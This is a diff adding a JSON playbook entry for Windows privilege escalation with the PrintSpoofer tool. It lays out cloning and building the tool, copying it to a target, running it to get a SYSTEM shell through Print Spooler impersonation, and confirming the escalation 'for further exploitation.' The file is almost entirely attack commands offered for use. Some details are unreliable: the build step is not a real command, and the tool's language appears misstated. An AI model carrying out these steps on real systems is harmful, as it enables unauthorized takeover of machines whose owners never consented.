@@ -1,0 +1,31 @@
+{
+    "name": "Windows Privilege Escalation with PrintSpoofer",
+    "description": "Exploit the Print Spooler service via named pipes and impersonation to escalate privileges, similar to potato techniques but targeted at spoolss.",
+    "tools": [
+        {
+            "name": "PrintSpoofer",
+            "description": "Tool for impersonating tokens through Print Spooler RPC calls for local privilege escalation",
+            "url": "https://github.com/itm4n/PrintSpoofer"
+        }
+    ],
+    "steps": [
+        {
+            "index": 1,
+            "name": "Download PrintSpoofer",
+            "command": "git clone https://github.com/itm4n/PrintSpoofer.git; cd PrintSpoofer; Build PrintSpoofer64.exe",
+            "description": "Clone the repo, compile the C# project for x64 (or x86), and copy to the target."
+        },
+        {
+            "index": 2,
+            "name": "Execute PrintSpoofer",
+            "command": "./PrintSpoofer64.exe -i -c \"cmd.exe /c whoami > C:\\temp\\elevated.txt\"",
+            "description": "Run with interactive mode (-i) to spawn an elevated shell via spooler impersonation, using the command flag for payload."
+        },
+        {
+            "index": 3,
+            "name": "Validate Escalation",
+            "command": "type C:\\temp\\elevated.txt; whoami /priv",
+            "description": "Check output for SYSTEM; use the elevated context for further enumeration or exploitation."
+        }
+    ]
+}
